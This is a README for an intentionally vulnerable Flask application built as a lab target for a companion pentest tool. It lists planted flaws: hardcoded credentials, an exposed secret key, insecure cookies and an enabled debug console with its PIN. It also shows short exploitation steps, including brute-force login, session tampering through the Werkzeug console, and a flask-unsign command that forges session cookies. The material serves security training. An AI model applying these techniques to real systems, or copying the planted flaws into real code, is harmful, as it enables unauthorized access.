# 🧪 Flask Security Testing Suite

> A deliberately vulnerable web application built with **Flask** and **Tailwind CSS** for offensive security testing, attack simulations, and reconnaissance tool validation.  
> Official target of the **Pentest Recon Engine**.

---

## 📖 About the Project

The **Flask Security Testing Suite** is an intentionally vulnerable web application designed to:

- Serve as a **testing target** for security scanners, reconnaissance pipelines, and brute force tools.
- Demonstrate **common web vulnerabilities** (weak credentials, exposed debug console, insecure cookies, hardcoded secret key).
- Provide an **admin dashboard** with rate limiting controls, auto-ban, request monitoring, and log export — enabling study of both the **defensive side**.
- Integrate seamlessly with the [Pentest Recon Engine](https://github.com/OtavioTavaresDev/Pentest-Recon-Engine), which automates the discovery and exploitation of these vulnerabilities.

---

## 🔗 Related Projects

| Project | Description |
|---------|-------------|
| [Pentest Recon Engine](https://github.com/OtavioTavaresDev/Pentest-Recon-Engine) | Offensive reconnaissance engine with modular pipeline, GUI, adaptive brute force, and professional export. |
| [Flask Security Testing Suite](https://github.com/OtavioTavaresDev/Flask-Security-Testing-Suite) | This vulnerable application. |

---

## 🧩 Features

### Public Pages
- **`/`** — Login screen with POST form (`username` and `password` fields). Modern design with Tailwind CSS.
- **`/dashboard`** — Session-protected dashboard. Displays a welcome message after successful login.

### Admin Dashboard (`/admin`)
- **Real-time indicators** for global RPS and banned IPs.
- **Global Rate Limiter**:
  - Enable/disable.
  - Manual mode (configurable float RPS) or automatic (adaptive).
- **Per-IP Rate Limiter**:
  - List of active IPs with requests per minute (RPM) and current RPS.
  - Field to set individual RPS.
  - "Reset" button to revert to default.
  - "Ban" button.
- **Auto-Ban (Pentest Detection)**:
  - Configurable threshold (req/min).
  - Pattern detection: excessive volume, many 404s, directory enumeration.
  - Auto-banned IPs highlighted.
- **Banned IPs**: list with option to unban.
- **Request Monitoring**: real-time logs (timestamp, method, status, path, IP, User‑Agent). "Ban" button per row.
- **Statistics**: total requests, unique IPs, 404/403 errors, top IPs, action suggestions.
- **Security Report**: integration with the latest Pentest Recon Engine scan (reads `reports/report.json`).
- **Log Export**: JSON, CSV, SQL, Markdown, TXT.

### Intentional Vulnerabilities
| # | Vulnerability | Description |
|---|---------------|-------------|
| 1 | **Hardcoded credentials** | `admin:123456`, `secure_user:P@ssw0rd!2024` stored in plain text. |
| 2 | **Exposed secret key** | `app.secret_key = "secret_key_123"` — allows forging session cookies. |
| 3 | **Insecure cookie** | Session marked with `httponly=False, secure=False`. |
| 4 | **Debug mode enabled** | `app.run(debug=True)` — exposes Werkzeug console with PIN (`669-931-934`). |
| 5 | **Weak authentication** | Simple user/password verification without brute force protection. |
| 6 | **Session-only protected route** | `/dashboard` accessible if `session["logged_in"] == True`. |

---

## 🛠️ Technologies

- **Python 3.11+** / **Flask 3.x**
- **Tailwind CSS** (CDN) — responsive and modern design
- **Jinja2** — dynamic templates
- **Threading** — concurrency control
- **In-memory persistence** — no external database

---

## 🚀 Installation and Usage

### Prerequisites
- Python 3.11+
- pip
- Modern browser

```bash
# Clone the repository
git clone https://github.com/OtavioTavaresDev/Flask-Security-Testing-Suite.git
cd Flask-Security-Testing-Suite

# Install Flask
pip install flask

# Run the application
python app.py
Access:

Vulnerable application: http://127.0.0.1:5000

Admin dashboard: http://127.0.0.1:5000/admin

🧪 Testing with Pentest Recon Engine
bash
# Clone the engine
git clone https://github.com/OtavioTavaresDev/Pentest-Recon-Engine.git
cd Pentest-Recon-Engine
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# Start the GUI
python main_gui.py
Test flow:

In the Scan tab, enter 127.0.0.1 and click Quick Scan.

In the Brute Force tab, click Scan Forms and then Start Brute Force.

Credentials admin:123456 will be discovered.

Access the admin dashboard and see requests being logged in real time.

Enable auto‑ban and use the Request Generator to simulate a brute force attack.

📊 Request Generator (Stress Testing)
bash
python request_generator.py
GUI tool (Tkinter) for sending configurable HTTP requests:

Method: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS.

Adjustable RPS (float).

Total requests (0 = infinite).

"Stop" button.

Ideal for testing the rate limiting and auto‑ban controls of the admin dashboard.

🧠 Exploitation Examples
Brute Force (via Pentest Recon Engine)
python
# The engine automatically sends username/password combinations
# Example request sent:
POST / HTTP/1.1
username=admin&password=123456
# Response: 302 Found (successful login)
Authentication Bypass via Werkzeug Console
Access http://127.0.0.1:5000/console

Enter the debugger PIN (669-931-934)

Execute:

python
from __main__ import app
with app.test_request_context():
    from flask import session
    session["logged_in"] = True
Access http://127.0.0.1:5000/dashboard — authenticated without credentials.

Session Cookie Forgery
bash
# With the known secret_key, fake cookies can be signed
pip install flask-unsign
flask-unsign --sign --secret 'secret_key_123' --cookie "{'logged_in': True}"
Copy the generated cookie and inject it into the browser.

📁 Project Structure
text
Flask-Security-Testing-Suite/
├── app.py                    # Main application (Flask)
├── templates/
│   ├── login.html            # Login screen (Tailwind)
│   ├── dashboard.html        # Post-login dashboard
│   └── admin.html            # Admin dashboard
├── passwords.txt             # Password wordlist for brute force
└── request_generator.py      # HTTP request generator
📄 License
MIT License. See the LICENSE file for more details.

⚠️ Disclaimer
This project is intended exclusively for educational purposes and testing in controlled environments.
Do not use against systems without explicit authorization.
The author assumes no responsibility for misuse of this tool.

👤 Author
Otávio Tavares
Offensive Security Engineering
GitHub
